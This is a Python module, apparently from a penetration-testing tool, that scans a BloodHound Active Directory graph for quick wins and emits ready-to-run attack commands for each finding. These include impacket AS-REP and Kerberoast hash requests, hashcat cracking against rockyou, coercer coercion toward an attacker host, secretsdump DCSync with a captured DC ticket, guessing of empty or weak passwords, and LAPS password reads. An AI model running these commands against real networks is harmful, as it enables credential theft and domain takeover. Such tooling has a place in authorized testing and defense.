"""Domain-wide quick-wins surfaced from BloodHound node Properties.

These don't require a path at all — they're things any pentester wants to know
about the dump regardless of which user is owned: AS-REP roastable accounts,
kerberoastable SPNs, unconstrained delegation, password-not-required, LAPS-readable
computers, sensitive accounts, ADCS-vulnerable templates, etc.
"""

from __future__ import annotations
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    import networkx as nx


@dataclass
class QuickWin:
    category: str          # short label: "AS-REP roast", "Kerberoast", ...
    node_id: str
    node_name: str
    node_kind: str
    detail: str = ""       # extra context (e.g. SPN list)
    commands: list[str] = field(default_factory=list)


def _props(G: "nx.DiGraph", nid: str) -> dict:
    return G.nodes[nid].get("props", {}) if nid in G else {}


def _domain_of(G: "nx.DiGraph", nid: str) -> str:
    """Best-effort domain extraction from a node's name."""
    name = G.nodes[nid].get("name", "") if nid in G else ""
    if "@" in name:
        return name.rsplit("@", 1)[1]
    if "." in name:
        return ".".join(name.split(".")[1:])
    return "<DOMAIN>"


def _short(name: str) -> str:
    if "@" in name:
        return name.rsplit("@", 1)[0]
    if "." in name:
        return name.split(".")[0]
    return name


# ── individual scanners ───────────────────────────────────────────────────────

def find_asrep_roastable(G: "nx.DiGraph") -> list[QuickWin]:
    out: list[QuickWin] = []
    for nid in G.nodes:
        p = _props(G, nid)
        if not p.get("dontreqpreauth"):
            continue
        if G.nodes[nid].get("kind") != "users":
            continue
        name = G.nodes[nid].get("name", nid)
        d = _domain_of(G, nid)
        out.append(QuickWin(
            category="AS-REP roast",
            node_id=nid,
            node_name=name,
            node_kind="users",
            detail="DontReqPreAuth=True — request the AS-REP without credentials.",
            commands=[
                f"impacket-GetNPUsers '{d}/' -no-pass -usersfile <(echo {_short(name)}) -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash",
                "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
            ],
        ))
    return out


def find_kerberoastable(G: "nx.DiGraph") -> list[QuickWin]:
    out: list[QuickWin] = []
    for nid in G.nodes:
        p = _props(G, nid)
        if not p.get("hasspn"):
            continue
        if G.nodes[nid].get("kind") != "users":
            continue
        name = G.nodes[nid].get("name", nid)
        if _short(name).lower() == "krbtgt":
            continue  # not actually attackable
        spns = p.get("serviceprincipalnames", []) or p.get("ServicePrincipalNames", [])
        spn_str = ", ".join(spns[:3]) if spns else "(SPN set)"
        d = _domain_of(G, nid)
        out.append(QuickWin(
            category="Kerberoast",
            node_id=nid,
            node_name=name,
            node_kind="users",
            detail=f"SPNs: {spn_str}",
            commands=[
                f"impacket-GetUserSPNs '{d}/<owned_user>:<owned_pass>' -dc-ip <DC_IP> -request-user '{_short(name)}' -outputfile kerb.hash",
                "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
            ],
        ))
    return out


def find_unconstrained_delegation(G: "nx.DiGraph") -> list[QuickWin]:
    out: list[QuickWin] = []
    for nid in G.nodes:
        p = _props(G, nid)
        if not p.get("unconstraineddelegation"):
            continue
        kind = G.nodes[nid].get("kind", "")
        name = G.nodes[nid].get("name", nid)
        d = _domain_of(G, nid)
        out.append(QuickWin(
            category="Unconstrained delegation",
            node_id=nid,
            node_name=name,
            node_kind=kind,
            detail="If you compromise this host, coerce a DC and capture its TGT from LSASS.",
            commands=[
                f"# 1. Get local admin on {name}, then start a TGT collector:",
                "# Rubeus.exe monitor /interval:1 /nowrap",
                f"# 2. Coerce a DC to authenticate to {name}:",
                f"coercer coerce -u '<owned_user>' -p '<owned_pass>' -d {d} -l {name} -t <DC_FQDN>",
                "# 3. Use the captured DC TGT to DCSync:",
                f"export KRB5CCNAME=DC.ccache && impacket-secretsdump -k -no-pass -just-dc '{d}/<DC_SHORT>$@<DC_FQDN>'",
            ],
        ))
    return out


def find_password_not_required(G: "nx.DiGraph") -> list[QuickWin]:
    out: list[QuickWin] = []
    for nid in G.nodes:
        p = _props(G, nid)
        if not p.get("passwordnotreqd"):
            continue
        if G.nodes[nid].get("kind") != "users":
            continue
        name = G.nodes[nid].get("name", nid)
        d = _domain_of(G, nid)
        out.append(QuickWin(
            category="Password not required",
            node_id=nid,
            node_name=name,
            node_kind="users",
            detail="ADS_UF_PASSWD_NOTREQD set — try empty / weak password, or set one with a privileged path.",
            commands=[
                f"nxc smb <DC_IP> -d {d} -u '{_short(name)}' -p '' --no-bruteforce",
                "# Or try common short ones:",
                f"nxc smb <DC_IP> -d {d} -u '{_short(name)}' -p '{_short(name)}' '{_short(name)}1' 'Password1'",
            ],
        ))
    return out


def find_laps_readable(G: "nx.DiGraph") -> list[QuickWin]:
    """Computers with LAPS — note only; reading rights are an edge (ReadLAPSPassword)."""
    out: list[QuickWin] = []
    for nid in G.nodes:
        p = _props(G, nid)
        if not p.get("haslaps"):
            continue
        if G.nodes[nid].get("kind") != "computers":
            continue
        name = G.nodes[nid].get("name", nid)
        d = _domain_of(G, nid)
        out.append(QuickWin(
            category="LAPS in use",
            node_id=nid,
            node_name=name,
            node_kind="computers",
            detail="LAPS is deployed on this host — if you control a principal with ReadLAPSPassword, retrieve the local admin password.",
            commands=[
                f"impacket-GetLAPSPassword '{d}/<owned_user>:<owned_pass>@<DC_IP>' -computer '{_short(name)}'",
                "# Or via nxc:",
                f"nxc ldap <DC_IP> -d {d} -u '<owned_user>' -p '<owned_pass>' -M laps",
            ],
        ))
    return out


def find_high_value(G: "nx.DiGraph") -> list[QuickWin]:
    out: list[QuickWin] = []
    seen = set()
    for nid in G.nodes:
        p = _props(G, nid)
        if not (p.get("highvalue") or p.get("HighValue")):
            continue
        kind = G.nodes[nid].get("kind", "")
        name = G.nodes[nid].get("name", nid)
        if name in seen:
            continue
        seen.add(name)
        out.append(QuickWin(
            category="High-value target",
            node_id=nid,
            node_name=name,
            node_kind=kind,
            detail="Marked HighValue by BloodHound — Tier 0 / privileged.",
        ))
    return out


def find_sensitive_no_protected(G: "nx.DiGraph") -> list[QuickWin]:
    """Privileged users (admincount=1) NOT in Protected Users / not sensitive-flagged."""
    out: list[QuickWin] = []
    for nid in G.nodes:
        p = _props(G, nid)
        if not p.get("admincount"):
            continue
        if G.nodes[nid].get("kind") != "users":
            continue
        if p.get("sensitive"):
            continue
        name = G.nodes[nid].get("name", nid)
        # Skip default service principals
        if _short(name).lower() in ("krbtgt", "guest"):
            continue
        out.append(QuickWin(
            category="Privileged user not protected",
            node_id=nid,
            node_name=name,
            node_kind="users",
            detail="AdminCount=1 but no 'sensitive and cannot be delegated' flag — vulnerable to delegation/coercion attacks.",
        ))
    return out


def find_adcs_vulnerable(G: "nx.DiGraph") -> list[QuickWin]:
    """Surface CertTemplates / CAs already linked via ADCS edges (ESC1-13)."""
    out: list[QuickWin] = []
    adcs_edges = {
        "ADCSESC1", "ADCSESC3", "ADCSESC4", "ADCSESC6a", "ADCSESC6b",
        "ADCSESC9a", "ADCSESC9b", "ADCSESC10a", "ADCSESC10b", "ADCSESC13",
        "GoldenCert",
    }
    seen: set[tuple[str, str]] = set()
    for src, dst, data in G.edges(data=True):
        rel = data.get("relation", "")
        if rel not in adcs_edges:
            continue
        key = (rel, dst)
        if key in seen:
            continue
        seen.add(key)
        out.append(QuickWin(
            category=f"ADCS {rel}",
            node_id=dst,
            node_name=G.nodes[dst].get("name", dst),
            node_kind=G.nodes[dst].get("kind", ""),
            detail=f"{rel} edge present in graph — exploitable from {G.nodes[src].get('name', src)}.",
        ))
    return out


def find_dc_servers(G: "nx.DiGraph") -> list[QuickWin]:
    """Domain controllers — useful to flag for coercion/relay opportunities."""
    out: list[QuickWin] = []
    for nid in G.nodes:
        if G.nodes[nid].get("kind") != "computers":
            continue
        # Member of "Domain Controllers" group → DC
        is_dc = False
        for _, dst in G.out_edges(nid):
            if "domain controllers" in G.nodes[dst].get("name", "").lower() and G[nid][dst].get("relation") == "MemberOf":
                is_dc = True
                break
        if not is_dc:
            continue
        name = G.nodes[nid].get("name", nid)
        out.append(QuickWin(
            category="Domain Controller",
            node_id=nid,
            node_name=name,
            node_kind="computers",
            detail="Coercion targets: PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM).",
            commands=[
                "# Coerce auth from this DC (as any authenticated user):",
                f"coercer coerce -u '<owned_user>' -p '<owned_pass>' -d <DOMAIN> -l <ATTACKER_IP> -t {name}",
            ],
        ))
    return out


# ── orchestrator ──────────────────────────────────────────────────────────────

def collect_all(G: "nx.DiGraph") -> dict[str, list[QuickWin]]:
    """Run all scanners; return {category: [QuickWin, ...]} keyed by category."""
    scanners = (
        find_asrep_roastable,
        find_kerberoastable,
        find_unconstrained_delegation,
        find_password_not_required,
        find_laps_readable,
        find_adcs_vulnerable,
        find_dc_servers,
        find_sensitive_no_protected,
        find_high_value,
    )
    bucket: dict[str, list[QuickWin]] = {}
    for fn in scanners:
        for qw in fn(G):
            bucket.setdefault(qw.category, []).append(qw)
    return bucket
